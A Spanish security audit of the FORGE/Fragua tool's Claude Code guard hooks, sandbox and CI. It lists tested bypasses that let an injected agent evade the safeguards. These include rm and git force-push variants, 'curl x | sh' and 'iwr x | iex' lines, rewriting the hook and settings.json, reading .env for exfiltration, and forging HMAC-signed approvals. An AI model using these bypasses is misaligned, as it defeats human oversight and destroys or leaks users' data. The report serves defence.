# Evaluación de ciberseguridad de FORGE/Fragua

> Fecha: 2026-11-06 · Alcance: revisión de solo lectura (no se cambió código ni configuración) · Método: lectura adversaria del código, más pruebas locales inofensivas. Esas pruebas alimentaron el hook con eventos JSON por stdin y llamaron a funciones puras. No se ejecutó ningún comando destructivo ni se usó red.
> CVSS 3.1 aproximado. El modelo de amenaza es este: **(A)** el agente LLM sigue instrucciones inyectadas (spec, issue, README o salida de una herramienta), o **(B)** el usuario abre un repositorio hostil.

## Resumen ejecutivo

El **núcleo del ciclo** está bien defendido: `core/ciclo/protocolo-archivos.js`, `core/escritura-segura.js`, `core/sandbox/politica.js`, `core/llm-providers/index.js` y `core/api/servidor.js`. Comprueba rutas con `lstat`/`realpath`, rechaza los nombres 8.3, los flujos alternativos (ADS), los puntos finales y los dispositivos. El contenedor corre sin red, de solo lectura y con `cap-drop ALL`. Las URL de los proveedores que pide el proyecto se filtran, y la API local tiene token y comprobación de Origin y Host.

La **capa de hooks de Claude Code** (`claude-hooks/pre-tool-guard.js`) es el punto débil:
- es una lista negra de expresiones regulares sobre texto libre, y se evade de forma trivial;
- si recibe un JSON que no puede leer, deja pasar (falla abierto);
- no protege su propio código ni `settings.json`;
- el agente puede desactivar el CircuitBreaker escribiendo un archivo de `.sdd/`.

La documentación no debe presentarla como un control de seguridad. Lo honesto es llamarla un recordatorio contra accidentes.

| ID | Severidad | CVSS ≈ | Título |
|---|---|---|---|
| C-01 | **Alta** | 8.1 | El agente puede reescribir los hooks y `.claude/settings.json` (autodesactivación) |
| C-02 | **Alta** | 7.7 | `pre-tool-guard`: los bloqueos de rm, git y PowerShell se evaden con variantes de sintaxis |
| C-03 | **Alta** | 7.1 | El agente puede falsificar aprobaciones y la cadena de evidencia (HMAC con clave legible por el mismo usuario) |
| C-04 | Media | 6.5 | La protección de `.env` y de la configuración protegida solo mira Write/Edit y unos pocos verbos de shell |
| C-05 | Media | 6.3 | CircuitBreaker: se puede desactivar o saltar (archivo escribible, salida temprana, código muerto) |
| C-06 | Media | 6.1 | Los agentes "solo lectura" escriben por Bash/PowerShell |
| C-07 | Media | 5.9 | El hook falla abierto ante una entrada que no puede leer |
| C-08 | Media | 5.6 | La imagen del sandbox ejecuta `pip install` con red y sin `--only-binary`; las bases no están fijadas por digest |
| C-09 | Baja | 4.3 | Secretos en claro en `.sdd/observabilidad/*.jsonl` (auditoría y DLQ) |
| C-10 | Baja | 3.7 | GitHub Actions sin fijar por SHA; `docs.yml` con `id-token: write` |
| C-11 | Baja | 3.5 | Detector de secretos incompleto (`sk-ant-…`, `github_pat_`, etc.) |
| C-12 | Baja | 3.1 | Permisos amplios en `.claude-plugin/.claude/settings.json` y un MCP con `npx -y` |
| C-13 | Info | — | Patrones ADR leídos de `.sdd/adrs` como texto libre: un repositorio puede bloquear contenidos (DoS leve) |

---

## C-01 · El agente puede reescribir los hooks y su registro (Alta, 8.1)

**Evidencia**
- `claude-hooks/pre-tool-guard.js:230-242`: lo único que se comprueba es `clasificarConfiguracionProtegida`. Esa función, en `core/evidencia/protegidos.js:20-33`, cubre tsconfig, biome, mypy y herramientas parecidas, pero **no** `.claude/`, `.claude/hooks/`, `claude-hooks/` ni `.sdd/`.
- Prueba local:
  ```
  {"tool_name":"Write","tool_input":{"file_path":".claude/settings.json","content":"{}"}}            -> exit=0
  {"tool_name":"Write","tool_input":{"file_path":"claude-hooks/pre-tool-guard.js","content":"process.exit(0)"}} -> exit=0
  ```

**Impacto.** Una instrucción inyectada consigue que el agente vacíe el hook o quite el registro de `PreToolUse`. A partir de la siguiente llamada a una herramienta, todos los controles de la capa de hooks desaparecen. El núcleo sí clasifica `.claude/settings.json` como `ruta_vetada`. La contradicción viene de que el hook no reutiliza esa clasificación.

**Corrección.**
1. En el hook, aplicar `clasificarRuta` del núcleo (o al menos `esVetada`) a todo Write, Edit, MultiEdit y NotebookEdit. Bloquear `.claude/**`, `claude-hooks/**`, `.sdd/execution-level.json`, `.sdd/estado.json` y `.git/**`.
2. Documentar que la protección real de `settings.json` es `permissions.deny` gestionado (managed settings), no el propio hook.

## C-02 · Las listas de comandos prohibidos se evaden con variantes de sintaxis (Alta, 7.7)

**Evidencia.** El bloqueo vive en `claude-hooks/pre-tool-guard.js:51-98`. Prueba local:

| Comando | Resultado |
|---|---|
| `rm -rf /` | bloqueado (2) |
| `rm -r -f /`, `rm -fr /`, `rm --recursive --force ~` | **permitido (0)** |
| `rm -rf ./`, `rm -rf *`, `find . -delete` | **permitido** |
| `Remove-Item -Force -Recurse C:\` (orden de parámetros invertido) | **permitido** |
| `git -c x=y push --force origin main`, `git push origin +main` | **permitido** |
| `git reset --merge HEAD~3` | permitido con aviso |

También hay esta cadena: `ADVERTENCIAS` (línea 398-407) hace `exit(0)` en cuanto encuentra coincidencia. Basta con añadir `# git push` a cualquier comando para saltarse el resto de comprobaciones, CircuitBreaker incluido (ver C-05).

**Impacto.** Borrado del árbol de trabajo o de la carpeta personal, y reescritura forzada del remoto, por inyección de prompt.

**Corrección.**
- Tokenizar el comando (shell-quote o una gramática de PowerShell) y razonar sobre argv: el verbo, las banderas normalizadas (`-r`, `-R`, `--recursive` y sus combinaciones) y los objetivos resueltos.
- Dividir por `;`, `&&`, `|` y `$(…)`.
- Que `ADVERTENCIAS` no termine la evaluación.
- Como defensa principal, apoyarse en `permissions.deny` de Claude Code y en ejecutar el agente dentro del sandbox. Las regex quedan como segunda línea.

## C-03 · Aprobaciones y evidencia falsificables por el propio agente (Alta, 7.1)

**Evidencia**
- `core/estado-usuario.js:9,71-76,161-179`: la clave HMAC está en `%LOCALAPPDATA%\fragua\integraciones\<hash>\clave` (o en `~/.fragua/...`), en hexadecimal y legible por el usuario.
- `core/integraciones/aprobacion.js:7,211,239` y `core/evidencia/cadena.js:2-24`: todo se firma y verifica con esa clave. La propia cabecera de `cadena.js:22` lo reconoce: «HMAC simétrico».
- El agente de Claude Code corre **como el mismo usuario**. El hook no le impide hacer `cat`/`Get-Content` de esa ruta ni ejecutar `node -e` con `firmar()` de `core/estado-usuario.js`.

**Impacto.** Un agente bajo inyección puede crear un pendiente de aprobación firmado, o un informe de evidencia con veredicto "aprobado", que la verificación local acepta como auténticos. Quedan comprometidos la publicación en GitHub, GitLab o Jira y el veredicto de la puerta. La cadena sí detecta las alteraciones *sin* la clave, que es la amenaza contra la que está diseñada.

**Corrección.**
- Separar el principal: firmar con una clave fuera del alcance del agente, por ejemplo en el llavero del sistema operativo (DPAPI o Keychain) con confirmación interactiva.
- Exigir una aprobación humana fuera de banda: un TTY interactivo con un código de un solo uso que se muestra al usuario y no llega al stdout del agente.
- En el hook, bloquear la lectura de rutas del estado de usuario y la invocación de `firmar`.
- Documentarlo como un límite explícito en el modelo de amenaza.

## C-04 · Protección de `.env` y de la configuración protegida evadible por shell (Media, 6.5)

**Evidencia** (`pre-tool-guard.js:85-93`, prueba local):
- Bloqueado: `echo X > .env` (2).
- **Permitido**: `sed -i s/a/b/ .env`, `node -e "require('fs').writeFileSync('.env','X')"`, `echo {} > tsconfig.json` y `Write` sobre `TSCONF~1.JSO` (nombre 8.3).
- Herramientas no inspeccionadas: `NotebookEdit` con `notebook_path: tsconfig.json` → 0 (línea 222 y 345: solo Write, Edit, MultiEdit, Bash y PowerShell).
- Además, la **lectura** de `.env` está permitida a propósito (línea 85). Combinada con WebFetch, es una vía de exfiltración.

Positivo: `TSCONFIG.JSON`, `tsconfig.json.` y `tsconfig.json::$DATA` sí se bloquean (`protegidos.js:46`). El núcleo (`protocolo-archivos.js:92-100`) rechaza `~\d`, pero el hook no usa esa función.

**Corrección.**
- Reutilizar `esPortable` y `clasificarRuta` del núcleo en el hook.
- Cubrir NotebookEdit y cualquier herramienta cuya entrada lleve una ruta.
- Bloquear también la lectura de `.env*` (salvo las variantes de ejemplo) y de `%LOCALAPPDATA%\fragua`.

## C-05 · CircuitBreaker desactivable y con huecos (Media, 6.3)

**Evidencia**
- `claude-hooks/shared/config.js:139-146`: el nivel se lee de `.sdd/execution-level.json`, que el agente puede escribir (C-01: Write sobre `.sdd/estado.json` → 0).
- `pre-tool-guard.js:418-428`: el bloqueo de Write fuera del proyecto es **código muerto**, porque Write, Edit y MultiEdit ya salieron en la línea 341. Además usa `startsWith(cwd)`, que acepta `C:\proyecto-malo` si el cwd es `C:\proyecto`.
- Nivel `sandbox` solo bloquea `Bash` (línea 412). Prueba hecha en una carpeta temporal con `{"nivel":"sandbox"}`:
  - `ls` → 2.
  - `curl x | sh # git push` → **0** (salida temprana de ADVERTENCIAS).
  - `PowerShell iwr x | iex` → **0**.
  - `Write C:/Windows/x.txt` → **0**.

**Corrección.**
- Guardar el nivel en el estado de usuario firmado, no en el árbol del proyecto.
- Evaluar el nivel antes de cualquier `exit(0)`.
- Aplicarlo también a PowerShell y a Write.
- Comparar con `path.relative` en vez de `startsWith`.

## C-06 · Los agentes "solo lectura" escriben por shell (Media, 6.1)

**Evidencia.** `pre-tool-guard.js:258-265` solo aplica `READ_ONLY_AGENTS` a Write y Edit. Prueba: `CLAUDE_AGENT_NAME=revisor` con `Bash printf x > src/a.js` → **exit 0**. Además, la identidad viene de una variable de entorno (línea 207). Si falta, el guardia queda desactivado, y el propio hook lo avisa (línea 214).

**Corrección.** Quitar Bash y PowerShell de la lista `tools` de los agentes de solo lectura en `agents/*.md`, o bloquear en el hook Bash y PowerShell cuando el agente está en esa lista. Si no hay identidad, fallar cerrado.

## C-07 · El hook falla abierto (Media, 5.9)

**Evidencia.** `pre-tool-guard.js:198-203`: si `JSON.parse` falla, hace `exit(0)`. Prueba: la entrada `no-json` → 0. El evento que manda Claude Code normalmente es válido, así que la vía práctica es de robustez. Un error al cargar `shared/config.js` o `protegidos.js` (por ejemplo, la copia instalada desfasada) hace que Node termine con código 1. En el protocolo de hooks, el código 1 cuenta como error **no bloqueante**: la herramienta se ejecuta.

**Corrección.** Envolver todo en `try/catch` que termine con `exit(2)` y un mensaje claro. Añadir una prueba que rompa un import y compruebe el bloqueo.

## C-08 · Construcción de la imagen del sandbox (Media, 5.6)

**Evidencia**
- `core/sandbox/preparar-imagen.js:110`: `RUN pip install … -r requirements.txt` se ejecuta durante `docker build`, con red y como root, y **sin** `--only-binary=:all:` ni `--require-hashes`. Un `requirements.txt` hostil (repositorio de tipo B, o uno que escriba el agente) ejecuta `setup.py` con red: puede exfiltrar todo lo que esté en el contexto de construcción y envenenar la imagen que luego juzga las pruebas.
- npm sí usa `--ignore-scripts` (línea 118-120). Go hace `go mod download` sin ejecutar código.
- Las bases son etiquetas mutables (líneas 21-24: `node:22-alpine`, `python:3.12-slim` y `golang:1.23-alpine`), sin `@sha256`.
- El `docker run` del ciclo es correcto (`politica.js:140-169`): `--network none`, `--cap-drop ALL`, `no-new-privileges`, `--read-only`, límites de pids, memoria y CPU, `--pull never`, usuario 1000 y validación del runtime con lista del lado del usuario. Lo que falta es `--security-opt seccomp`/AppArmor explícito (se usa el perfil por defecto de Docker) y `--ipc none`.

**Corrección.**
- `pip install --only-binary=:all: --require-hashes` (o `pip download` en un paso aparte y sin secretos).
- Construir con `--network` restringida a un proxy de paquetes.
- Fijar las bases por digest.
- Añadir `--ipc=none`.

## C-09 · Secretos en claro en los registros de observabilidad (Baja, 4.3)

**Evidencia.** `pre-tool-guard.js:352-355` registra `cmd_preview` (120 caracteres) **antes** de comprobar secretos (línea 386). `bloquear()` también guarda `input` en `dlq.jsonl` (línea 40-46). En el repositorio ya hay 8 líneas con `ghp_AAAA…` en `.sdd/observabilidad/agent-tool-audit.jsonl`. Son de prueba, pero demuestran el comportamiento. `.gitignore:10` excluye `.sdd/*`, lo que mitiga el riesgo de subirlos, pero los archivos se quedan en disco y dentro del contexto que el agente puede leer.

**Corrección.** Pasar `redactar()` (`core/ciclo/redactar.js`) antes de cualquier escritura de auditoría o DLQ, y limitar el tamaño y la rotación.

## C-10 · Cadena de suministro en CI (Baja, 3.7)

**Evidencia**
- `.github/workflows/*.yml`: las acciones están fijadas por etiqueta mayor (`actions/checkout@v4`, `setup-node@v4`, `upload-artifact@v4`, `configure-pages@v5`, `upload-pages-artifact@v3`, `deploy-pages@v4`), no por SHA.
- `ci.yml:9-10` y `evals-modelo-real.yml` usan `permissions: contents: read`. Correcto.
- `docs.yml:13-14` tiene `pages: write` e `id-token: write` a nivel de workflow. Es aceptable para Pages, pero conviene moverlo al job.
- `evals-modelo-real.yml` solo se lanza con `workflow_dispatch` y pasa `inputs.tope` por variable de entorno, no interpolado en `run`. No hay inyección de expresiones. Correcto.
- `npm ci` se ejecuta **sin** `--ignore-scripts` en todos los jobs. Hay 3 dependencias directas (`@anthropic-ai/sdk`, `@sqlite.org/sqlite-wasm`, `acorn`) con rango `^`, mitigado por el lockfile.

**Corrección.** Fijar las acciones por SHA con Dependabot o Renovate, usar `npm ci --ignore-scripts` y añadir `npm audit signatures` en CI.

## C-11 · Detector de secretos incompleto (Baja, 3.5)

**Evidencia.** `pre-tool-guard.js:118-128`: `sk-[a-zA-Z0-9]{20,}` no reconoce las claves de Anthropic (`sk-ant-api03-…`, porque llevan guiones). Prueba: Write con `"sk-ant-api03-AAAA…"` → **exit 0**. Tampoco cubre `github_pat_`, `glpat-`, `xoxe`, JWT ni la URL de Slack. `core/ciclo/redactar.js` tiene un catálogo mejor que el hook no reutiliza.

**Corrección.** Una sola fuente de patrones (`redactar.js`), compartida por el hook y el núcleo.

## C-12 · Permisos amplios y MCP de terceros (Baja, 3.1)

**Evidencia**
- `.claude-plugin/.claude/settings.json` concede `WebSearch`, `Bash(git commit *)`, `Bash(git rm *)` y `Bash(git add *)`. WebSearch sin restricción, junto con la lectura permitida de `.env` (C-04), forma una vía de exfiltración.
- `.mcp.json` lanza `npx -y @playwright/mcp@0.0.83`. La versión está fijada, cosa que está bien, pero `-y` instala sin integridad verificada fuera del lockfile.
- El MCP propio (`core/mcp/limites.js:23-24`) tiene límites razonables de tiempo, salida y frecuencia, pero los techos se pueden subir por entorno (hasta 1800 s y 10 000 llamadas al día).

**Corrección.** No empaquetar permisos de desarrollo en el plugin. Restringir WebFetch y WebSearch por dominio, y fijar el MCP con `npm ci` local.

## C-13 · DoS y falsos bloqueos por ADR (Info)

`pre-tool-guard.js:150-163` extrae como «prohibido» cualquier texto tras «evitar», «NO usar» o «banned» en `.sdd/adrs/*`. Un repositorio hostil, o una spec inyectada, puede declarar prohibidos términos como `function` o `import` y bloquear todas las escrituras. La vía nueva (`.sdd/arquitectura`, línea 170-189) es más estricta. **Corrección:** retirar la vía heredada.

---

## Controles verificados como sólidos (sin hallazgo)

- **Rutas en el núcleo** (`protocolo-archivos.js:92-100,224-255`): rechazo de rutas absolutas, UNC, `..`, 8.3 (`~\d`), ADS, punto o espacio final y dispositivos; `realpath` doble y veto sobre la ruta lógica y la real. Prueba: `clasificarRuta('GIT~1/config')` devuelve `null`, pero `validarRuta` lo rechaza antes por `ruta_no_portable`.
- **`escritura-segura.js`**: `lstat`, creación con `wx` (O_EXCL), contención con `realpath` y reemplazo atómico por `rename`.
- **Proveedores LLM** (`llm-providers/index.js:141-156`): el `base_url` del proyecto se ignora si apunta a loopback o a un host no permitido por el usuario, para que la clave no se fugue.
- **API HTTP** (`core/api/servidor.js:200-210,301`): solo escucha en 127.0.0.1, token Bearer de 32 bytes comparado en tiempo constante, rechazo de `Origin`, lista de Host permitidos y detección de Host duplicado.
- **Runtime de Docker**: `sandbox.runtime` necesita la autorización del usuario (`politica.js:67-78`), y argv se valida contra inyección de opciones (`sinGuion`, comas en `--mount`).
- No se encontraron claves reales en el repositorio: solo marcadores de prueba (`sk-ant-REVISION-…`, `ghp_AAAA…`).

## Qué falta (fuera del alcance de esta revisión)

1. No se ejecutó Docker real (escape, seccomp, comportamiento de `--read-only` con el montaje bind de escritura) ni las suites `tests/sandbox-real.test.js`.
2. No se auditaron `node_modules` ni las dependencias transitivas (`npm audit`, firmas). No había red.
3. Revisión superficial de `core/mcp/protocolo.js`, `herramientas.js` y `herramientas-verificar.js` (parseo JSON-RPC, tamaño de mensajes) y de los proveedores GitHub, GitLab y Jira (`core/integraciones/proveedores/*`: SSRF por `hosts.js`, manejo de tokens).
4. Inyección de prompt de extremo a extremo con un modelo real (spec, issue, error y salida de pruebas → agente → herramienta). Solo se revisó el delimitador `core/ciclo/dato-no-confiable.js` por encima.
5. Los ataques TOCTOU en `escritura-segura.js` en Windows (uniones o junctions) y los enlaces duros no se probaron de forma dinámica.
6. No se revisó `ui/`, `mcp-figma/` ni los scripts `instalar.sh` e `instalar.ps1` (posible `curl | sh`).

## Prioridad de corrección

1. **C-01, C-05 y C-06**: que el hook reutilice `validarRuta` y `clasificarRuta` del núcleo, proteja `.claude/**`, `claude-hooks/**` y `.sdd/execution-level.json`, y aplique el nivel antes de cualquier salida.
2. **C-03**: sacar la clave HMAC del alcance del agente o exigir un TTY humano para aprobar.
3. **C-02, C-04 y C-07**: parser de argv, fallo cerrado, cobertura de NotebookEdit y bloqueo de lectura de `.env`.
4. **C-08 a C-11**: pip seguro, digests, redacción en los registros y acciones fijadas por SHA.

## Estado de la mitigación (corregido el 2026-11-07 tras `REVERIFICACION-SEGURIDAD.md`)

La primera versión de esta tabla (2026-11-06) exageraba. Un auditor independiente repitió los ataques; esta es la lectura que sostiene la evidencia (postura 3/5, antes 2/5).

| Hallazgo | Estado | Qué falta |
|---|---|---|
| C-01 reescribir hooks y registro | **Parcial** | `Write` sobre `.sdd/estado.json` salía con exit 0: se añade a las rutas críticas (`core/evidencia/guardian-reglas.js`) |
| C-02 variantes de `rm`, `git push`, `Remove-Item` | **Parcial** | las formas del informe se bloquean; variables (`$X`), alias, `eval`, here-docs y scripts no se resuelven (límite declarado en `SECURITY.md`) |
| C-03 clave HMAC y aprobación de la spec | **Abierto → corregido en parte** | el TTY y el código protegían `forge aprobar`, pero la puerta de `core/state-machine.js` leía un booleano de `.sdd/estado.json` escribible por el agente. Se protege ese archivo; la clave sigue al alcance del mismo usuario |
| C-04 `.env` y configuración por shell | **Parcial** | `Grep` sobre `.env` devuelve exit 0: requiere cambio en el hook (ver `PARCHE-HOOK-PENDIENTE.md`) |
| C-05 CircuitBreaker | **Cerrado** | |
| C-06 solo lectura por shell | **Parcial** | depende de `CLAUDE_AGENT_NAME`; `disenador-api` figura como solo lectura pero declara `Write`; los agentes conservan `Bash` |
| C-07 falla abierto | **Parcial** | dentro del script falla cerrado; si `.claude/settings.json` no resuelve la ruta relativa del hook, Node sale con 1 (no bloqueante) y la herramienta se ejecuta |
| C-08 imagen del sandbox | **Cerrado en lo esencial** | bases por digest, `--only-binary`, `--ipc none`. Sigue habiendo red durante la construcción de la imagen Python |
| C-09 secretos en registros | **Parcial** | `github_pat_` quedaba en claro en `agent-tool-audit.jsonl` |
| C-10 cadena de suministro en CI | **Parcial** | acciones por SHA y `npm ci --ignore-scripts` hechos; falta `npm audit signatures` y `docs.yml` tiene permisos a nivel de workflow |
| C-11 detector de secretos | **Parcial** | `sk-ant-` cubierto; `github_pat_` y `glpat-` no |
| C-12 permisos del plugin | **Cerrado** | |
| C-13 vía heredada de ADR | **Cerrado** | |

Specs relacionadas: `2026-11-06-guardian-endurecido` y `2026-11-06-aprobaciones-con-identidad` (ambas en borrador, sin aprobación del dueño).
